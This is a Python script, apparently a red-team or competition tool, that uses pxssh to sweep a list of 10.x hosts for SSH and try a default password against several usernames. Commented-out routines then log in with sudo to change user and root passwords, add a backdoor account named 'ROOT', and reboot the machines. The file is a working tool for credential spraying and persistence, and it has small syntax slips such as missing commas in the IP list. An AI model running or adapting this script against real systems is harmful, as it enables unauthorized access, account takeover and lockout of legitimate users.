import socket
from pexpect import pxssh
def test(ip, name):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.settimeout(1)
	
	try:
		s.connect((ip, 22))
		s.shutdown(2)
		print(ip+": connected over SSH")
		s.close()
		try:
			s = pxssh.pxssh()
			s.login(ip, name, "Changeme123!")
			s.sendline("whoami")
			s.prompt()
			print(s.before)
			print("----------------------------------------------")
			print("\n")
			s.logout()
		except:
			print("creds changed")
	except:
		fail = 1

#######
#linux
def pass_linux(ip):
	try:
		s = pxssh.pxssh()
		s.login(ip, "vgonzales", "Changeme123!")
		s.sendline("sudo passwd")
		s.prompt()
		print(s.before)
		s.sendline("Changeme123!")
		s.prompt()
		print(s.before)
		s.sendline("POOP")
		s.prompt()
		print(s.before)
		s.sendline("POOP")
		s.prompt()
		print(s.before)
		print("----------------------------------------------")
		print("\n")
		s.logout()
	except:
		print("FAILED")
		print("\n")

def create_account(ip):
	try:
		s = pxssh.pxssh()
		s.login(ip, "vgonzales", "POOP")
		s.sendline("sudo useradd ROOT")
		s.prompt()
		print(s.before)
		s.sendline("POOP")
		s.prompt()
		print(s.before)
		s.sendline("sudo passwd ROOT")
		s.prompt()
		print(s.before)
		s.sendline("POOP")
		s.prompt()
		print(s.before)
		s.sendline("POOP")
		s.prompt()
		print(s.before)
		s.sendline("POOP")
		s.prompt()
		print(s.before)
		print("----------------------------------------------")
		print("\n")
		s.logout()
	except:
		print("FAILED")
		print("\n")

def centos_create_account(ip):
	try:
		s = pxssh.pxssh()
		s.login(ip, "vgonzales", "POOP")
		s.sendline("sudo adduser ROOT")
		s.prompt()
		print(s.before)
		s.sendline("POOP")
		s.prompt()
		print(s.before)
		s.sendline("sudo passwd ROOT")
		s.prompt()
		print(s.before)
		s.sendline("POOP")
		s.prompt()
		print(s.before)
		s.sendline("POOP")
		s.prompt()
		print(s.before)
		s.sendline("POOP")
		s.prompt()
		print(s.before)
		s.sendline("POOP")
		s.prompt()
		print(s.before)
		print("----------------------------------------------")
		print("\n")
		s.logout()
	except:
		print("FAILED")
		print("\n")

def root_pass(ip):
	try:
		s = pxssh.pxssh()
		s.login(ip, "vgonzales", "POOP")
		s.sendline("sudo passwd root")
		s.prompt()
		print(s.before)
		s.sendline("POOP")
		s.prompt()
		print(s.before)
		print("----------------------------------------------")
		print("\n")
		s.logout()
	except:
		print("FAILED")
		print("\n")

def reboot(ip):
	try:
		s = pxssh.pxssh()
		s.login(ip, "vgonzales", "POOP")
		s.sendline("sudo reboot")
		s.prompt()
		print(s.before)
		s.sendline("POOP")
		s.prompt()
		print(s.before)
		print("----------------------------------------------")
		print("\n")
		s.logout()
	except:
		print("FAILED")
		print("\n")


ip = ["10.1.1.1","10.1.1.2","10.1.1.3","10.1.1.4", "10.1.1.5"
      "10.1.2.1","10.1.2.2","10.1.2.3","10.1.2.4","10.1.2.5",
      "10.2.1.1","10.2.1.2","10.2.1.3","10.2.1.4", "10.2.1.5"
      "10.2.2.1","10.2.2.2","10.2.2.3","10.2.2.4","10.2.2.5"]
windows = ["10.1.1.1","10.1.1.2","10.1.1.3","10.2.1.1","10.2.1.2","10.2.1.3","10.1.2.1","10.2.2.1"]
linux = ["10.1.1.4","10.1.1.5","10.2.1.4","10.2.1.5","10.1.2.2","10.1.2.5","10.2.2.2","10.2.2.5"]
centos = ["10.1.2.3","10.1.2.4","10.2.2.3","10.2.2.4",]

name = ["vgonzales","dvinky","xmusk","agus"]

######################################
######################################
for i in ip:
	for x in name:
		test(i,x)

#for i in linux:
	#pass_linux(i)
#for i in centos:
	#pass_linux(i)

#for i in linux:
	#create_account(i)

#for i in centos:
	#centos_create_account(i)

#for i in linux:
	#root_pass(i)

#for i in linux
	#reboot(i)

######################################
######################################


